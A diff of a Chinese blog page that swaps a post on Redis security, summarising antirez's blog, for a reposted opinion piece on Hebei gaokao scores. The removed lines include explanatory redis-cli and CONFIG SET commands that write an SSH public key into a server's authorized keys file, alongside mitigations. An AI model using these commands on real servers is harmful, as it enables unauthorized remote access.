@@ -2,17 +2,17 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>Redis的安全哲学 - 璐濒殉漂流记</title>
+  <title>知乎回答·河北高考分数高意味着什么 - 璐濒殉漂流记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
   
-  <meta name="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
+  <meta name="description" content="https://www.zhihu.com/question/31762126/answer/107369501 利益相关:十几年前的河南考生 河南山西江西的考生的应试能力差不多,河北考生的应试能力完全碾压其他几省. 但这事是河北考生的悲哀而不是骄傲. 上面">
   <meta name="author" content="Lawulu">
-  <meta itemprop="name" content="Redis的安全哲学 - 璐濒殉漂流记">
-  <meta itemprop="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
+  <meta itemprop="name" content="知乎回答·河北高考分数高意味着什么 - 璐濒殉漂流记">
+  <meta itemprop="description" content="https://www.zhihu.com/question/31762126/answer/107369501 利益相关:十几年前的河南考生 河南山西江西的考生的应试能力差不多,河北考生的应试能力完全碾压其他几省. 但这事是河北考生的悲哀而不是骄傲. 上面">
   <meta itemprop="image" content="https://lawulu.github.io/img/author.jpg">
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:site" content="@inza9hi" />
-  <meta name="twitter:title" content="Redis的安全哲学 - 璐濒殉漂流记" />
+  <meta name="twitter:title" content="知乎回答·河北高考分数高意味着什么 - 璐濒殉漂流记" />
   
   <meta name="twitter:description" content="">
   
@@ -63,7 +63,7 @@
 	<article itemprop="articleBody">
     <header class="article-info clearfix">
   <h1 itemprop="name">
-      <a href="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" title="Redis的安全哲学" itemprop="url">Redis的安全哲学</a>
+      <a href="https://lawulu.github.io/post/%E6%B2%B3%E5%8C%97%E9%AB%98%E8%80%83%E5%88%86%E6%95%B0%E7%BA%BF/" title="知乎回答·河北高考分数高意味着什么" itemprop="url">知乎回答·河北高考分数高意味着什么</a>
   </h1>
   <p class="article-author">By
     
@@ -71,7 +71,7 @@
     
   </p>
   <p class="article-time">
-    <time datetime="2016-02-15 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年02月15日</time>
+    <time datetime="2016-06-27 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年06月27日</time>
   </p>
 </header>
 
@@ -79,102 +79,46 @@
     
 		<div class="toc-article">
 			<strong class="toc-title">文章目录</strong>
-      <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</a></li>
-<li><a href="#一次hack过程">一次Hack过程</a></li>
-<li><a href="#为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</a></li>
-<li><a href="#使用auth">使用Auth</a></li>
-</ul></li>
-</ul>
-</nav>
+      
 		</div>
     
-    
+    <p><a href="https://www.zhihu.com/question/31762126/answer/107369501">https://www.zhihu.com/question/31762126/answer/107369501</a>
+利益相关:十几年前的河南考生</p>
 
-<p>最近看到Redis的作者antirez写的一篇blog: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a>
-里面有些东西很有意思.摘录一些观点:</p>
+<hr />
 
-<h2 id="为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</h2>
+<p>河南山西江西的考生的应试能力差不多,河北考生的应试能力完全碾压其他几省. 但这事是河北考生的悲哀而不是骄傲.</p>
 
-<p>作者说经常收到一些Redis不安全的Report,但是大部分Report其实跟Redis没有什么关系或者说对Redis来说无关紧要.因为Redis的绝大多数用户都是将Redis放到一个安全的环境里面,而安全是一个很大的feature,Redis不会为了一小撮用户做开发这么复杂的功能.
-&gt;it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself</p>
+<p>上面很多答案已经说了是衡水中学的影响, 有兴趣的可以研究一下衡水中学跟河北整体分数的相关性.
+我上学时候,貌似从来没有听说过河北考生的分数这么高,大概是衡水中学起来之后,河北高考分数越来越变态的.2016年河北700分以上达到了恐怖的168人,比去年多了90+..</p>
 
-<h2 id="一次hack过程">一次Hack过程</h2>
+<p>这对高中生来说是好事还是坏事?</p>
 
-<p>安全页面写到: <a href="http://redis.io/topics/security">http://redis.io/topics/security</a>
-&gt;the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running</p>
+<p>可能是好事,<strong>如果通过高中的训练,能有能力把一件事做的比全国其他同龄人更好,或许以后人生在其他竞争中应该更容易胜出.</strong>
+但是,我觉得肯定大部分家长不愿意自己孩子在高强度压力和竞争之下,需要比全国其他同龄人花费更多的时间和精力去拼命学习,去刷题(天赋一般的话理科考高分基本靠刷题),去练字(可以搜下衡水中学的语文英语作文字体). 而对于没有进入超级中学,或者进入超级中学而高考失败的考生,更是残酷.</p>
 
-<p>所以,使用config命令可以往主机的Path写文件,作者展示了这一过程(为防止有些<code>script kiddies cut &amp; paste the attack</code>,没有直接提供一个脚本,并且还首先备份了当前的数据,这里省略一些无关紧要的步骤):</p>
+<p>说说我老家的情况,豫南某县城. 县城两所高中,一个重点一个普通,我高考时候重点高中班级前十基本可以进一本线,而现在一个班前三名才有可能进一本线.
+跟我们那时候比,一个是生源差了,初中按片升学,没有重点初中,中考招生,教委要求重点高中在某个分数线之后需要和普通高中轮流录取,换句话来说,重点高中不重点了,想想90年代时候,母校每个年级还有重点班,也被教委给取消了;另外就是很多好老师都去大城市了,也招不来好老师了.事实上,跨县高中之间竞争不大,升学率跟校长和县教委政绩挂钩不大,教委和校长没有动力去高压学生.</p>
 
-<ol>
-<li>生成一对RSA key,并且写到一个文件里面,前后加上换行符
-<code>
-$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt
-</code></li>
-<li>将public key写到一个KV里面
-<code>
-cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
-</code></li>
-<li>设置工作目录
-<code>
-config set dir /Users/antirez/.ssh/
-</code></li>
-<li>将内存中数据保存到Db文件中
-<code>
-config set dbfilename &quot;authorized.keys&quot;
-save
-</code></li>
-</ol>
-
-<p>大功告成!</p>
-
-<h2 id="为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</h2>
-
-<p>事实上,如果启动时候带上默认的配置文件(redis.conf),就不存在这个安全隐患,因为配置文件里面默认是只绑定了Loopback address.既然作者知道这个安全隐患,为什么不默认启用这个配置文件呢?(就像Mysql那样).</p>
-
-<p>作者的解释是,因为RTFM（Read The Fucking Manual）</p>
-
-<h2 id="使用auth">使用Auth</h2>
-
-<p>虽然并不能真正解决安全问题..最简单有效的方法就是使用Auth.使用Auth的的几点说明:</p>
-
-<ol>
-<li>密码要尽可能的复杂,以防被brute force</li>
-<li>Auth的消耗非常少,只是在连接建立时候做一次鉴权,只有连接在,就不用再做鉴权</li>
-<li>未来可能会有ACL机制,比如某些用户并没有<code>config set dir</code>的权限</li>
-</ol>
+<p>高考不公平,单纯讨论分数没有意义. 因为各省市的情况不一样. 假如全国一套卷子一个录取线,相信我,不出三年,帝都人大附学生的考分绝对不比衡水差. 横向比较一本率(考虑到很多省内211招取了很多本地考生,或许用985录取率)才有意义.</p>
 
 	</div>
   <footer class="article-footer clearfix">
   
-
-<div class="article-tags">
-  <span></span>
-  
-  <a href="https://lawulu.github.io/tags/redis">redis</a>
-  
-  <a href="https://lawulu.github.io/tags/%E5%AE%89%E5%85%A8">安全</a>
-  
-</div>
-
-
 
 
 
 <div class="article-categories">
   <span></span>
   
-  <a class="article-category-link" href="https://lawulu.github.io/categories/akiross">AkiRoss</a>
+  <a class="article-category-link" href="https://lawulu.github.io/categories/aij%E4%B8%80%E6%80%9D%E8%80%83">Aij一思考</a>
   
 </div>
 
 
 
   <div class="article-share" id="share">
-    <div data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" data-title="Redis的安全哲学" data-tsina="" class="share clearfix">
+    <div data-url="https://lawulu.github.io/post/%E6%B2%B3%E5%8C%97%E9%AB%98%E8%80%83%E5%88%86%E6%95%B0%E7%BA%BF/" data-title="知乎回答·河北高考分数高意味着什么" data-tsina="" class="share clearfix">
     </div>
   </div>
 </footer>
@@ -182,8 +126,8 @@ save
 	</article>
   
 <section class="comment">
-  <div class="ds-thread" data-thread-key="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"
-   data-title="Redis的安全哲学" data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"></div>
+  <div class="ds-thread" data-thread-key="https://lawulu.github.io/post/%E6%B2%B3%E5%8C%97%E9%AB%98%E8%80%83%E5%88%86%E6%95%B0%E7%BA%BF/"
+   data-title="知乎回答·河北高考分数高意味着什么" data-url="https://lawulu.github.io/post/%E6%B2%B3%E5%8C%97%E9%AB%98%E8%80%83%E5%88%86%E6%95%B0%E7%BA%BF/"></div>
 </section>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"inza9hi"};
